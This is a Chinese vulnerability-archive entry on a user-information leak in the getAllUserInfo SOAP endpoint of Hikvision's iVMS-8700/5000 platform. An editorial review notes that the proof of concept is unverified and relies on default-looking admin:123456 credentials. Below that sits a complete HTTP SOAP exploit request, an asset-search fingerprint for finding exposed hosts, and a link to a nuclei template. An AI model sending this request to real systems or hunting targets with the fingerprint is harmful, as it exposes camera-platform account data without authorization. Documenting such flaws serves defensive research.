---
source: "wy876 漏洞文库"
id: "vw-48148e7b29ed2747f50bbf26"
entity_id: "ve-48148e7b29ed2747f50bbf26"
schema_version: "1"
fofa_unverified: "web.body="
title: "海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞"
product: "Hikvision iVMS-5000/8700"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Basic admin:123456，有效性/硬编码未知；版本缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0getAllUserInfo%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vlzpa0f6workvx4g"
source_status: "recorded"
---

# 海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-5000/8700
- 本文讨论：IWsBaseService getAllUserInfo用户信息读取
- 版本、权限与配置前提：Basic admin:123456，有效性/硬编码未知；版本缺失
- 资料类型：SOAP用户列表PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求含有效形态凭据而不说明是否弱口令/硬编码/越权，不能认定未授权
- 缺Content-Type/SOAPAction，updTime空long是否接受需核；重复Connection
- 没有响应字段，无法确定密码/敏感内容；YAML外链未审
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- Basic账号可改性/实际角色、5000范围和SOAP参数待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`


+ 登录页面：


# 四、漏洞复现
```http
POST /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 569
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Authorization: Basic YWRtaW46MTIzNDU2
Connection: close
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
<soapenv:Header/>
<soapenv:Body>
    <impl:getAllUserInfo>
        <impl:request>
            <!--type: int-->
            <xsd:pageNo>1</xsd:pageNo>
            <!--type: int-->
            <xsd:pageSize>1</xsd:pageSize>
        </impl:request>
        <!--type: long-->
        <impl:updTime></impl:updTime>
    </impl:getAllUserInfo>
</soapenv:Body>
</soapenv:Envelope>
```


nuclei脚本：

[海康威视-ivms-8700-信息泄露.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222237212-7f41ac18-a5a1-46d6-aa2e-960b2d07f2fd.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vlzpa0f6workvx4g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
